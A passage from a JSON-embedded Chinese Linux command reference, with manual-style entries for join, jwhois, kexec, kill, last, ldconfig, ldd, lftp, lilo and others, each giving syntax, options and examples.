\n\n```\n-a\u003c1或2\u003e：除了显示原来的输出内容之外，还显示指令文件中没有相同栏位的行；\n-e\u003c字符串\u003e：若[文件1]与[文件2]中找不到指定的栏位，则在输出中填入选项中的字符串；\n-i或--ignore-case：比较栏位内容时，忽略大小写的差异；\n-o\u003c格式\u003e：按照指定的格式来显示结果；\n-t\u003c字符\u003e：使用栏位的分割字符；\n-v\u003c1或2\u003e：更-a相同，但是只显示文件中没有相同栏位的行；\n-1\u003c栏位\u003e：连接[文件1]指定的栏位；\n-2\u003c栏位\u003e：连接[文件2]指定的栏位。\n```\n\n### 参数  \n\n*   文件1：要进行合并操作的第1个文件参数；\n*   文件2：要进行合并操作的第2个文件参数。\n\n\n"},{"name":"jwhois","categoryId":0,"data":"jwhois\n\u003d\u003d\u003d\n\nwhois 客户端服务\n\n## 补充说明\n\n**jwhois**  searches Whois servers for the object on the command line.The host to query is taken from a global configuration file, a configuration file specified on the command line, or selected directly on the command line.\n\n### 语法  \n\n```\njwhois [选项]\n```\n\n### 选项  \n\n```\n--version                  display version number and patch level\n--help                     display this help\n-v, --verbose              verbose debug output\n-c FILE, --config\u003dFILE     use FILE as configuration file\n-h HOST, --host\u003dHOST       explicitly query HOST\n-n, --no-redirect          disable content redirection\n-s, --no-whoisservers      disable whois-servers.net service support\n-a, --raw                  disable reformatting of the query\n-i, --display-redirections display all redirects instead of hiding them\n-p PORT, --port\u003dPORT       use port number PORT (in conjunction with HOST)\n-r, --rwhois               force an rwhois query to be made\n--rwhois-display\u003dDISPLAY   sets the display option in rwhois queries\n--rwhois-limit\u003dLIMIT       sets the maximum number of matches to return\n```\n\n\u003e 注：以上英文部分寻求网友协助翻译，翻译结果可发送至 sa(at)linuxde.net，谢谢！\n\n### 实例  \n\n显示指定用户信息：\n\n```\n# jwhois root\n\n//查找root用户信息\n```\n\n查询域名信息：\n\n```\n[root@localhost ~]# jwhois linuxde.net\n[Querying whois.verisign-grs.com]\n[Redirected to whois.west263.com]\n[Querying whois.west263.com]\n[whois.west263.com]\nDomain Name: linuxde.net                   \nRegistry Domain id: whois protect\nRegistrar WHOIS Server: whois.west263.com\n\n...省略部分内容\n```\n\n\n"},{"name":"kernelversion","categoryId":0,"data":"kernelversion\n\u003d\u003d\u003d\n\n打印当前内核的主版本号\n\n## 补充说明\n\n**kernelversion命令** 用于打印当前内核的主版本号。\n\n### 语法  \n\n```\nkernelversion\n```\n\n\n"},{"name":"kexec","categoryId":0,"data":"kexec\n\u003d\u003d\u003d\n\n从当前正在运行的内核引导到一个新内核\n\n## 补充说明\n\n**kexec命令** 是Linux内核的一个补丁，让您可以从当前正在运行的内核直接引导到一个新内核。在上面描述的引导序列中，kexec跳过了整个引导装载程序阶段（第一部分）并直接跳转到我们希望引导到的内核。不再有硬件的重启，不再有固件操作，不再涉及引导装载程序。完全避开了引导序列中最弱的一环 -- 固件。这一功能部件带来的最大益处在于，系统现在可以极其快速地重新启动。\n\n **kexec的好处：** 要求高可用性的系统，以及需要不断重新启动系统的内核开发人员，都将受益于kexec。因为 kexec跳过了系统重新启动过程中最耗时的部分（也就是固件初始化硬件设备的阶段），所以重新启动变得非常快，可用性得到了提高。\n\n### 语法  \n\n```\nkexec(选项)\n```\n\n### 选项  \n\n```\n-l：指定内核映像文件；\n-e：允许当前被加载的内核；\n-f：强制立即调用系统调用“kexec”，而不调用“shutdown”；\n-t：指定新内核的类型；\n-u：卸载当前的kexec目标内核。\n```\n\n\n"},{"name":"kill","categoryId":2,"data":"kill\n\u003d\u003d\u003d\n\n删除执行中的程序或工作\n\n## 补充说明\n\n**kill命令** 用来删除执行中的程序或工作。kill可将指定的信息送至程序。预设的信息为SIGTERM(15),可将指定程序终止。若仍无法终止该程序，可使用SIGKILL(9)信息尝试强制删除程序。程序或工作的编号可利用ps指令或job指令查看。\n\n### 语法  \n\n```\nkill(选项)(参数)\n```\n\n### 选项  \n\n```\n-a：当处理当前进程时，不限制命令名和进程号的对应关系；\n-l \u003c信息编号\u003e：若不加\u003c信息编号\u003e选项，则-l参数会列出全部的信息名称；\n-p：指定kill 命令只打印相关进程的进程号，而不发送任何信号；\n-s \u003c信息名称或编号\u003e：指定要送出的信息；\n-u：指定用户。\n```\n\n### 参数  \n\n进程或作业识别号：指定要删除的进程或作业。\n\n### 实例  \n\n列出所有信号名称：\n\n```\n kill -l\n 1) SIGHUP       2) SIGINT       3) SIGQUIT      4) SIGILL\n 5) SIGTRAP      6) SIGABRT      7) SIGBUS       8) SIGFPE\n 9) SIGKILL     10) SIGUSR1     11) SIGSEGV     12) SIGUSR2\n13) SIGPIPE     14) SIGALRM     15) SIGTERM     16) SIGSTKFLT\n17) SIGCHLD     18) SIGCONT     19) SIGSTOP     20) SIGTSTP\n21) SIGTTIN     22) SIGTTOU     23) SIGURG      24) SIGXCPU\n25) SIGXFSZ     26) SIGVTALRM   27) SIGPROF     28) SIGWINCH\n29) SIGIO       30) SIGPWR      31) SIGSYS      34) SIGRTMIN\n35) SIGRTMIN+1  36) SIGRTMIN+2  37) SIGRTMIN+3  38) SIGRTMIN+4\n39) SIGRTMIN+5  40) SIGRTMIN+6  41) SIGRTMIN+7  42) SIGRTMIN+8\n43) SIGRTMIN+9  44) SIGRTMIN+10 45) SIGRTMIN+11 46) SIGRTMIN+12\n47) SIGRTMIN+13 48) SIGRTMIN+14 49) SIGRTMIN+15 50) SIGRTMAX-14\n51) SIGRTMAX-13 52) SIGRTMAX-12 53) SIGRTMAX-11 54) SIGRTMAX-10\n55) SIGRTMAX-9  56) SIGRTMAX-8  57) SIGRTMAX-7  58) SIGRTMAX-6\n59) SIGRTMAX-5  60) SIGRTMAX-4  61) SIGRTMAX-3  62) SIGRTMAX-2\n63) SIGRTMAX-1  64) SIGRTMAX\n```\n\n只有第9种信号(SIGKILL)才可以无条件终止进程，其他信号进程都有权利忽略， **下面是常用的信号：** \n\n```\nHUP     1    终端断线\nINT     2    中断（同 Ctrl + C）\nQUIT    3    退出（同 Ctrl + \\）\nTERM   15    终止\nKILL    9    强制终止\nCONT   18    继续（与STOP相反， fg/bg命令）\nSTOP   19    暂停（同 Ctrl + Z）\n```\n\n先用ps查找进程，然后用kill杀掉：\n\n```\nps -ef | grep vim\nroot      3268  2884  0 16:21 pts/1    00:00:00 vim install.log\nroot      3370  2822  0 16:21 pts/0    00:00:00 grep vim\n\nkill 3268\nkill 3268\n-bash: kill: (3268) - 没有那个进程\n```\n\n\n"},{"name":"last","categoryId":2,"data":"last\n\u003d\u003d\u003d\n\n列出目前与过去登入系统的用户相关信息\n\n## 补充说明\n\n**last命令** 用于显示用户最近登录信息。单独执行last命令，它会读取`/var/log/wtmp`的文件，并把该给文件的内容记录的登入系统的用户名单全部显示出来。\n\n### 语法  \n\n```\nlast(选项)(参数)\n```\n\n### 选项  \n\n```\n-a：把从何处登入系统的主机名称或ip地址，显示在最后一行；\n-d：将IP地址转换成主机名称；\n-f \u003c记录文件\u003e：指定记录文件。\n-n \u003c显示列数\u003e或-\u003c显示列数\u003e：设置列出名单的显示列数；\n-R：不显示登入系统的主机名称或IP地址；\n-x：显示系统关机，重新开机，以及执行等级的改变等信息。\n```\n\n### 参数  \n\n*   用户名：显示用户登录列表；\n*   终端：显示从指定终端的登录列表。\n\n### 实例  \n\nlast命令用了显示用户登录情况，以下是直接显示固定行数的记录：\n\n```\nlast -10\nroot     pts/0        221.6.45.34      Tue Dec 17 09:40   still logged in\nroot     pts/0        221.6.45.34      Mon Dec 16 09:00 - 11:57  (02:56)\nroot     pts/0        222.94.97.122    Sun Dec 15 20:39 - 23:28  (02:48)\nroot     pts/0        222.95.209.80    Sat Dec 14 14:39 - 14:58  (00:18)\nroot     pts/0        221.6.45.34      Thu Dec 12 16:55 - 17:37  (00:41)\nroot     pts/0        49.65.139.195    Wed Dec 11 20:40 - 21:16  (00:35)\nroot     pts/0        49.65.139.195    Wed Dec 11 19:46 - 20:03  (00:17)\nroot     pts/0        221.6.45.34      Tue Dec 10 14:41 - 15:52  (01:10)\nroot     pts/0        221.6.45.34      Mon Dec  9 17:24 - 17:30  (00:06)\nroot     pts/0        221.6.45.34      Mon Dec  9 09:38 - 11:41  (02:02)\n```\n\n\n"},{"name":"ld","categoryId":0,"data":"ld\n\u003d\u003d\u003d\n\n将目标文件连接为可执行程序\n\n## 补充说明\n\n**ld命令** 是GNU的连接器，将目标文件连接为可执行程序。\n\n### 语法  \n\n```\nld(选项)(参数)\n```\n\n### 选项  \n\n```\n-o：指定输出文件名；\n-e：指定程序的入口符号。\n```\n\n### 参数  \n\n目标文件：指定需要连接的目标文件。\n\n\n"},{"name":"ldconfig","categoryId":0,"data":"ldconfig\n\u003d\u003d\u003d\n\n动态链接库管理命令\n\n## 补充说明\n\n**ldconfig命令** 的用途主要是在默认搜寻目录`/lib`和`/usr/lib`以及动态库配置文件`/etc/ld.so.conf`内所列的目录下，搜索出可共享的动态链接库（格式如lib*.so*）,进而创建出动态装入程序(ld.so)所需的连接和缓存文件。缓存文件默认为`/etc/ld.so.cache`，此文件保存已排好序的动态链接库名字列表，为了让动态链接库为系统所共享，需运行动态链接库的管理命令ldconfig，此执行程序存放在`/sbin`目录下。\n\nldconfig通常在系统启动时运行，而当用户安装了一个新的动态链接库时，就需要手工运行这个命令。\n\n### 语法  \n\n```\nldconfig [-v|--verbose] [-n] [-N] [-X] [-f CONF] [-C CACHE] [-r ROOT] [-l] [-p|--print-cache] [-c FORMAT] [--format\u003dFORMAT] [-V] -?|--[help|--usage] path... \n```\n\n### 选项  \n\n```\n-v或--verbose：用此选项时，ldconfig将显示正在扫描的目录及搜索到的动态链接库，还有它所创建的连接的名字。\n-n：用此选项时,ldconfig仅扫描命令行指定的目录，不扫描默认目录（/lib、/usr/lib），也不扫描配置文件/etc/ld.so.conf所列的目录。\n-N：此选项指示ldconfig不重建缓存文件（/etc/ld.so.cache），若未用-X选项，ldconfig照常更新文件的连接。\n-X：此选项指示ldconfig不更新文件的连接，若未用-N选项，则缓存文件正常更新。\n-f CONF：此选项指定动态链接库的配置文件为CONF，系统默认为/etc/ld.so.conf。\n-C CACHE：此选项指定生成的缓存文件为CACHE，系统默认的是/etc/ld.so.cache，此文件存放已排好序的可共享的动态链接库的列表。\n-r ROOT：此选项改变应用程序的根目录为ROOT（是调用chroot函数实现的）。选择此项时，系统默认的配置文件/etc/ld.so.conf，实际对应的为ROOT/etc/ld.so.conf。如用-r /usr/zzz时，打开配置文件/etc/ld.so.conf时，实际打开的是/usr/zzz/etc/ld.so.conf文件。用此选项，可以大大增加动态链接库管理的灵活性。\n-l：通常情况下,ldconfig搜索动态链接库时将自动建立动态链接库的连接，选择此项时，将进入专家模式，需要手工设置连接，一般用户不用此项。\n-p或--print-cache：此选项指示ldconfig打印出当前缓存文件所保存的所有共享库的名字。\n-c FORMAT 或 --format\u003dFORMAT：此选项用于指定缓存文件所使用的格式，共有三种：old(老格式)，new(新格式)和compat（兼容格式，此为默认格式）。\n-V：此选项打印出ldconfig的版本信息，而后退出。\n-? 或 --help 或 --usage：这三个选项作用相同，都是让ldconfig打印出其帮助信息，而后退出。\n```\n\n **ldconfig几个需要注意的地方：** \n\n1.  往`/lib`和`/usr/lib`里面加东西，是不用修改`/etc/ld.so.conf`的，但是完了之后要调一下ldconfig，不然这个library会找不到。\n2.  想往上面两个目录以外加东西的时候，一定要修改`/etc/ld.so.conf`，然后再调用ldconfig，不然也会找不到。\n3.  比如安装了一个mysql到`/usr/local/mysql`，mysql有一大堆library在`/usr/local/mysql/lib`下面，这时就需要在`/etc/ld.so.conf`下面加一行`/usr/local/mysql/lib`，保存过后ldconfig一下，新的library才能在程序运行时被找到。\n4.  如果想在这两个目录以外放lib，但是又不想在`/etc/ld.so.conf`中加东西（或者是没有权限加东西）。那也可以，就是export一个全局变量LD_LIBRARY_PATH，然后运行程序的时候就会去这个目录中找library。一般来讲这只是一种临时的解决方案，在没有权限或临时需要的时候使用。\n5.  ldconfig做的这些东西都与运行程序时有关，跟编译时一点关系都没有。编译的时候还是该加-L就得加，不要混淆了。\n6.  总之，就是不管做了什么关于library的变动后，最好都ldconfig一下，不然会出现一些意想不到的结果。不会花太多的时间，但是会省很多的事。\n7.  再有，诸如libdb-4.3.so文件头中是会含有库名相关的信息的（即含“libdb-4.3.so”，可用strings命令察看），因此仅通过修改文件名以冒充某已被识别的库（如libdb-4.8.so）是行不通的。为此可在编译库的Makefile中直接修改配置信息，指定特别的库名。\n\n\n"},{"name":"ldd","categoryId":0,"data":"ldd\n\u003d\u003d\u003d\n\n打印程序或者库文件所依赖的共享库列表\n\n## 补充说明\n\n**ldd命令** 用于打印程序或者库文件所依赖的共享库列表。\n\n### 语法  \n\n```\nldd(选项)(参数)\n```\n\n### 选项  \n\n```\n--version：打印指令版本号；\n-v：详细信息模式，打印所有相关信息；\n-u：打印未使用的直接依赖；\n-d：执行重定位和报告任何丢失的对象；\n-r：执行数据对象和函数的重定位，并且报告任何丢失的对象和函数；\n--help：显示帮助信息。\n```\n\n### 参数  \n\n文件：指定可执行程序或者文库。\n\n### 其他介绍  \n\n首先ldd不是一个可执行程序，而只是一个shell脚本\n\nldd能够显示可执行模块的dependency，其原理是通过设置一系列的环境变量，如下：`LD_TRACE_LOADED_OBJECTS、LD_WARN、LD_BIND_NOW、LD_LIBRARY_VERSION、LD_VERBOSE`等。当`LD_TRACE_LOADED_OBJECTS`环境变量不为空时，任何可执行程序在运行时，它都会只显示模块的dependency，而程序并不真正执行。要不你可以在shell终端测试一下，如下：\n\n```\nexport LD_TRACE_LOADED_OBJECTS\u003d1\n```\n\n再执行任何的程序，如ls等，看看程序的运行结果。\n\nldd显示可执行模块的dependency的工作原理，其实质是通过ld-linux.so（elf动态库的装载器）来实现的。我们知道，ld-linux.so模块会先于executable模块程序工作，并获得控制权，因此当上述的那些环境变量被设置时，ld-linux.so选择了显示可执行模块的dependency。\n\n实际上可以直接执行ld-linux.so模块，如：`/lib/ld-linux.so.2 --list program`（这相当于ldd program）\n\n\n"},{"name":"less","categoryId":0,"data":"less\n\u003d\u003d\u003d\n\n分屏上下翻页浏览文件内容\n\n## 补充说明\n\n**less命令** 的作用与more十分相似，都可以用来浏览文字档案的内容，不同的是less命令允许用户向前或向后浏览文件，而more命令只能向前浏览。用less命令显示文件时，用PageUp键向上翻页，用PageDown键向下翻页。要退出less程序，应按Q键。\n\n### 语法  \n\n```\nless(选项)(参数)\n```\n\n### 选项  \n\n```\n-e：文件内容显示完毕后，自动退出；\n-f：强制显示文件；\n-g：不加亮显示搜索到的所有关键词，仅显示当前显示的关键字，以提高显示速度；\n-l：搜索时忽略大小写的差异；\n-N：每一行行首显示行号；\n-s：将连续多个空行压缩成一行显示；\n-S：在单行显示较长的内容，而不换行显示；\n-x\u003c数字\u003e：将TAB字符显示为指定个数的空格字符。\n```\n\n### 参数  \n\n文件：指定要分屏显示内容的文件。\n\n\n"},{"name":"let","categoryId":0,"data":"let\n\u003d\u003d\u003d\n\n简单的计算器\n\n## 补充说明\n\n**let命令** 是bash中用于计算的工具，提供常用运算符还提供了方幂`**`运算符。在变量的房屋计算中不需要加上`$`来表示变量，如果表达式的值是非0，那么返回的状态值是0；否则，返回的状态值是1。\n\n### 语法  \n\n```\nlet arg [arg ...]    #arg代表运算式\n```\n\n### 用法  \n\n自加操作`let no++`  \n自减操作`let no--`  \n简写形式`let no+\u003d10`，`let no-\u003d20`，分别等同于`let no\u003dno+10，``let no\u003dno-20`\n\n### 实例  \n\n```\n#!/bin/bash\nlet a\u003d5+4 b\u003d9-3\necho $a $b\n```\n\n```\n#!/bin/bash\nlet \"t1 \u003d ((a \u003d 5 + 3, b \u003d 7 - 1, c \u003d 15 - 4))\"\necho \"t1 \u003d $t1, a \u003d $a, b \u003d $b\"\n```\n\n\n"},{"name":"lftp","categoryId":0,"data":"lftp\n\u003d\u003d\u003d\n\n优秀的文件客户端程序\n\n## 补充说明\n\n**lftp命令** 是一款优秀的文件客户端程序，它支持ftp、SETP、HTTP和FTPs等多种文件传输协议。lftp支持tab自动补全，记不得命令双击tab键，就可以看到可能的选项了。\n\n### 语法  \n\n```\nlftp(选项)(参数)\n```\n\n### 选项  \n\n```\n-f：指定lftp指令要执行的脚本文件；\n-c：执行指定的命令后退出；\n--help：显示帮助信息；\n--version：显示指令的版本号。\n```\n\n### 参数  \n\n站点：要访问的站点的ip地址或者域名。\n\n### 实例  \n\n **登录ftp** \n\n```\nlftp 用户名:密码@ftp地址:传送端口（默认21）\n```\n\n也可以先不带用户名登录，然后在接口界面下用login命令来用指定账号登录，密码不显示。\n\n **查看文件与改变目录** \n\n```\nls\ncd 对应ftp目录\n```\n\n **下载** \n\nget当然是可以的，还可以：\n\n```\nmget -c *.pdf    #把所有的pdf文件以允许断点续传的方式下载。\nmirror aaa/      #将aaa目录整个的下载下来，子目录也会自动复制。\npget -c -n 10 file.dat   #以最多10个线程以允许断点续传的方式下载file.dat，可以通过设置pget:default-n的值而使用默认值。\n```\n\n **上传** \n\n同样的put、mput都是对文件的操作，和下载类似。\n\n```\nmirror -R 本地目录名\n```\n\n将本地目录以迭代（包括子目录）的方式反向上传到ftp site。\n\n **模式设置** \n\n```\nset ftp:charset gbk\n```\n\n远程ftp site用gbk编码，对应的要设置为utf8,只要替换gbk为utf8即可。\n\n```\nset file:charset utf8\n```\n\n本地的charset设定为utf8,如果你是gbk，相应改掉。\n\n```\nset ftp:passive-mode 1\n```\n\n使用被动模式登录，有些site要求必须用被动模式或者主动模式才可以登录，这个开关就是设置这个的。0代表不用被动模式。\n\n **书签** \n\n其实命令行也可以有书签，在lftp终端提示符下：\n\n```\nbookmark add ustc\n```\n\n就可以把当前正在浏览的ftp site用ustc作为标签储存起来。以后在shell终端下，直接`lftp ustc`就可以自动填好用户名和密码，进入对应的目录了。\n\n```\nbookmark edit\n```\n\n会调用编辑器手动修改书签。当然，也可以看到，这个书签其实就是个简单的文本文件。密码，用户名都可以看到。\n\n **配置文件** \n\n```\nvim /etc/lftp.conf\n```\n\n一般，我会添加这几行：\n\n```\nset ftp:charset gbk\nset file:charset utf8\nset pget:default-n 5\n```\n\n这样，就不用每次进入都要打命令了。其他的set可以自己tab然后help来看。\n\n\n"},{"name":"lilo","categoryId":4,"data":"lilo\n\u003d\u003d\u003d\n\n安装核心载入开机管理程序\n\n## 补充说明\n\n**lilo命令** 用于安装核心载入，开机管理程序。lilo是个Linux系统核心载入程序，同时具备管理开机的功能。单独执行lilo指令，它会读取/etc/lilo.conf配置文件，然后根据其内容安装lilo。\n\nLinux lilo已经成为所有 Linux 发行版的标准组成部分。作为一个 较老的/最老的 Linux 引导加载程序，它那不断壮大的 Linux 社区支持使它能够随时间的推移而发展，并始终能够充当一个可用的现代引导加载程序。有一些新的功能，比如增强的用户界面，以及对能够突破原来 1024-柱面限制的新 BIOS 功能的利用。\n\n虽然 LILO 仍在不断地发展，但 LILO 工作原理的基本概念保持不变。\n\n### 语法  \n\n```\nlilo(选项)\n```\n\n### 选项  \n\n```\n-b\u003c外围设备代号\u003e：指定安装lilo之处的外围设备代号；\n-c：使用紧致映射模式；\n-C\u003c配置文件\u003e：指定lilo的配置文件；\n-d\u003c延迟时间\u003e：设置开机延迟时间；\n-D\u003c识别标签\u003e：指定开机后预设启动的操作系统，或系统核心识别标签；\n-f\u003c几何参数文件\u003e：指定磁盘的几何参数配置文件；\n-i\u003c开机磁区文件\u003e：指定欲使用的开机磁区文件，预设是/boot目录里的boot.b文件；\n-I\u003c识别标签\u003e：显示系统核心存放之处；\n-l：产生线形磁区地址；\n-m\u003c映射文件\u003e：指定映射文件；\n-P\u003cfix/ignore\u003e：决定要修复或忽略分区表的错误；\n-q：列出映射的系统核心文件；\n-r\u003c根目录\u003e：设置系统启动时欲挂入成为根目录的目录；\n-R\u003c执行指令\u003e：设置下次启动系统时，首先执行的指令；\n-s\u003c备份文件\u003e：指定备份文件；\n-S\u003c备份文件\u003e：强制指定备份文件；\n-t：不执行指令，仅列出实际执行会进行的动作；\n-u\u003c外围色设备代号\u003e：删除lilo；\n-U\u003c外围设备代号\u003e：此选项的效果和指定\"-u\"参数类似，当不检查时间戳记；\n-v：显示指令执行过程；\n-V：显示版本信息。\n```\n\n### 实例  \n\n **使用 LILO 作为引导加载程序** \n\n要使用 LILO 作为引导加载程序，需要做的事情取决于是要进行全新安装还是要让已经安装的 Linux 改为使用 LILO。如果是要进行全新安装，那么直接跳转到 配置 LILO 那一节。如果已经安装了某个 Linux 发行版，那么通常可以选择安装并配置 LILO（并可以将机器引导到新的 Linux 安装）。\n\n要将现有的 Linux 迁移到 LILO，首先必须获得最新版本的 LILO（见 参考资料）。在做任何其他事情之前，建议您确保在手边拥有一张 Linux 引导盘 —— 如果偶而弄错了某些地方，它可以提供很大的帮助，能够恢复到初始的 Linux 配置！将 LILO 安装到系统中之后，让它接管 MBR 非常简单。以 root 用户身份输入：\n\n```\n/sbin/lilo -v -v\n```\n\n这将使用当前的 LILO 默认值，抹去 MBR 中当前所有内容。不过，请阅读 配置 LILO，以确保能够按预期引导起来。也要注意，如果想要在同一机器上运行 Windows 和 Linux，那么应该先安装 Windows OS，然后再安装 Linux OS，这样，在 Linux 安装中所选择的引导加载程序就不会被 Windows 引导加载程序所覆盖。与 Linux 引导加载程序不同，多数 Window 引导加载程序不支持引导 Linux。如果已经先安装了 Linux，那么只需要自己创建一张 Linux 引导盘，这样就可以在安装完 Windows 之后，回到 Linux 安装中并重写 MBR。\n\n **配置 LILO** \n\nLILO 的配置都是通过位于 /etc/lilo.conf 的一个配置文件来完成的。清单 1 给出了一个示例配置，使用的是我的家用机器，支持 Linux 和 Windows 机器的双重引导。了解我的工作站的基本配置，就可以想像出这些配置是如何与实际机器相关联的：\n\n主 HDD（物理磁盘 1）上安装了 Windows XP（最初机器上只有它）。在 Linux 术语中，这个 HDD 是 /dev/hda（在 grub 术语中是 hd0,0）。\n\n从 HDD（物理磁盘 2）上安装了 Red Hat Linux；root 分区位于这个硬盘驱动器的第三个分区，即 /dev/hdb3（在 GRUB 术语中是 hd1,3）。\n\nlilo.conf 示例文件：\n\n```\nboot\u003d/dev/hda\nmap\u003d/boot/map\ninstall\u003d/boot/boot.b\nprompt\ntimeout\u003d100\ncompact\ndefault\u003dLinux\nimage\u003d/boot/vmlinuz-2.4.18-14\n\tlabel\u003dLinux\n\troot\u003d/dev/hdb3\n\tread-only\n\tpassword\u003dlinux\nother\u003d/dev/hda\n\tlabel\u003dWindowsXP\n```\n\n配置文件选项说明：\n\n*   boot\u003d 行告诉 LILO 在哪里安装引导加载程序。在上面的示例中，将把它安装到第一块硬盘的 MBR。也可以选择将 LILO 安装到 /dev/hdb3（示例中的 Linux 分区），这样需要向 /dev/hda 安装另一个引导加载程序，并令其指向 LILO 引导加载程序；然后只需要让 LILO 作为二级引导加载程序。通常，引导加载程序应该位于 /dev/hda。还可以将这个参数指向软盘驱动器（最常见的是 /dev/fd0），来制做 LILO 软盘引导磁盘。\n*   map\u003d 指向引导期间 LILO 内部使用的映射文件。当使用 /sbin/lilo 命令安装 LILO 时， 它会自动生成这个文件，其中包含有描述符表（还有其他内容）。建议不要改动这个文件！\n*   install\u003d 是 LILO 在引导过程中内部使用的文件之一。它同时包含有引导加载程序的主要部分和二级部分。boot.b 文件的 一个片段被写入到 MBR（引导加载程序的主要部分），它会指向那个映射，接下来指向二级引导加载程序。同样，不要改动它！\n*   prompt\u003d 告诉 LILO 使用用户界面（本例中给出了两个选择 —— Linux 和 WindowsXP）。除了使用 prompt/user 界面以外，在适当情况下还可以为 Linux 内核等指定具体的参数。如果不在配置文件中指定此选项，那么 LILO 将引导到 默认的 OS，不发生任何用户交互，也不会等待。（但是请注意，如果在引导时按下了 SHIFT，那么还是可以得到提示，当不想把 引导加载程序暴露给普通用户时，这非常有用）。\n*   timeout\u003d 是引导提示在自动引导默认 OS（本例中是 Linux）之前的等待时间（以十分之一秒为单位）。 如果在 lilo.conf 没有指定 prompt，那么这个参数就会被忽略。\n*   compact 选项可以大大加速引导过程，它会将连续的读磁盘的请求合并为一个单独的请求。不过，这可能是 一件祸福参半的事情，因为我在论坛上看到过很多贴子提到了关于此选项的问题。当希望从软盘引导时，这个选项尤其有用。\n*   default\u003d 选项告诉 LILO 默认使用哪个映像进行引导，比如在等待超时之后。这与 lilo.conf 文件中的某个映像的 标签相关联。如果没有在配置文件中指定此选项，那么它将引导文件中指定的第一个映像。\n*   对于允许用户引导到的每一个 Linux 版本，都应该指定 image\u003d 及以下三个选项。image 选项指定希望 引导到的内核版本。\n*   label\u003d 标明了在运行期间希望能够从用户界面引导的不同 OS。另外，这个标签用于指定引导的默认 OS。 （注意：标签名称中避免出现空格；否则，引导那个文件时会出现无法预期的错误。）\n*   root\u003d 告诉 LILO OS 文件系统实际所在的位置。在我们的示例中为 /dev/hdb3，即第二块硬盘上的第三个分区。\n*   read-only 告诉 LILO 以只读的方式初始引导到文件系统。OS 一旦完全引导起来，就会以读写方式挂载。\n*   password\u003d 允许您为将要引导到的特定 OS 设置口令。不幸的是，这个口令是以可读文本的方式保存在 lilo.conf 文件中，所以，所有人都能够读取它。如果需要，还可以对想要引导自的每个操作系统设置口令（在我们的示例中，只为 Linux 的引导 设置了一个口令）。\n*   other\u003d 的动作类似于 image 和 root 选项的组合，但是用于除了 Linux 以外的其他操作系统。 在我们的示例中，它告诉 LILO 到哪里去找到 Windows OS（位于第一块硬盘的第一个分区）。如果先安装 Windows，后安装 Linux，通常会是这样。\n*   label\u003d 与所有其他 label 选项相同。\n\n在 lilo.conf 文件中可以使用很多其他参数，不过清单 1 中的参数就足以让机器可用了。要获得关于 lilo.conf 的这些以及其他参数的 进一步资料，请参考手册页（man lilo.conf）。由于在引导时不会读取 lilo.conf，所以，当这个文件有改动时，需要“更新”MBR。 如果不完成此步骤就重新引导，那么对 lilo.conf 的修改不会在启动中反映出来。与先前将 LILO 写入 MBR 类似，需要运行：\n\n```\n/sbin/lilo -v -v\n```\n\n`-v -v`标记会为您给出非常详细的输出。当像我们那样运行 LILO 时，有很多参数可以指定。 参阅手册页以获得更进一步的信息（man lilo）。\n\n **初始引导过程** \n\n当 LILO 初始引导时，它会按次序打印出每个字母 —— L-I-L-O。如果所有字母都显示出来，那么第一阶段引导就成功了。缺少任何内容 都表示出现了问题：\n\nL：第一阶段引导加载程序已经被加载。如果 LILO 停止在这里，那么是在引导第二阶段引导加载程序时出现了问题。这通常会伴随有一个错误代码。 在这个阶段的常见问题是介质问题，或者在 lilo.conf 文件中指定了不正确的磁盘参数。\n\nLI：第二阶段引导加载程序已经被加载。LILO 在此处停止表示第二阶段引导加载程序不能被执行。同样，这可能是因为出现了与只显示 L 类似的问题： 正在加载，或者因 boot.b 文件被破坏、移动或删除而不能加载。\n\nLIL：第二阶段引导加载程序正在被执行。此时，可能会再次出现介质问题，或者映射文件（如 lilo.conf 文件中所指定的）在寻找描述符表时 可能会出现问题。\n\nLIL?：加载到与上面相同的阶段。这通常意味着加载第二阶段引导加载程序使用了错误的地址，最常见的原因是 boot.b 所在的位置与 lilo.conf 文件所指定的不同。\n\nLIL-：加载到与上面相同的阶段。加载描述符表时出现问题，最常见的原因是描述符表错误。\n\nLILO：LILO 成功被加载，没有出现任何错误。\n\n **引导时的附加配置** \n\nLILO 被成功加载后，将看到 LILO 提示符。还是使用前面的示例 lilo.conf 文件，此时将有两个选择，可能对 LILO 新手来说并不直观。首先，可以 让 LILO 超时（10 秒后），这将引导`/dev/hdb3`，即 Linux 分区。另外，可以按下 TAB 键，这将列出将要引导的操作系统选项。在我们的示例 lilo.conf 中， 将得到的选项是 “Linux” 和 “Windows”。输入哪一个，就会引导到哪个 OS。指定加载 Linux 选项，会提示输入一个口令，在本例中是 linux。如果输入的口令有误，则会返回 LILO 提示符。\n\n不幸的是，LILO 不支持引导期间的交互式配置，所以，只能在 lilo.conf 中或者运行`/sbin/lilo`时指定选项。\n\n关于第一次尝试 LILO 的最后一点建议是：我发现使用软盘引导磁盘比使用硬盘实现 LILO 配置更为安全。为此，必须在 lilo.conf 文件中使用`boot\u003d/dev/fd0`替换`boot\u003d/dev/hda`。那样，如果弄乱了lilo.conf文件 中的任何配置，都可以取出引导磁盘并像先前一样引导到 Linux。当使用软盘进行引导一切正常以后，可以将lilo.conf修改回`boot\u003d/dev/hda`，然后最后一次运行`/sbin/lilo`来上传修改。\n\n\n"},{"name":"ln","categoryId":6,"data":"ln\n\u003d\u003d\u003d\n\n用来为文件创件连接\n\n## 补充说明\n\n**ln命令** 用来为文件创件连接，连接类型分为硬连接和符号连接两种，默认的连接类型是硬连接。如果要创建符号连接必须使用\"-s\"选项。\n\n注意：符号链接文件不是一个独立的文件，它的许多属性依赖于源文件，所以给符号链接文件设置存取权限是没有意义的。\n\n### 语法  \n\n```\nln(选项)(参数)\n```\n\n### 选项  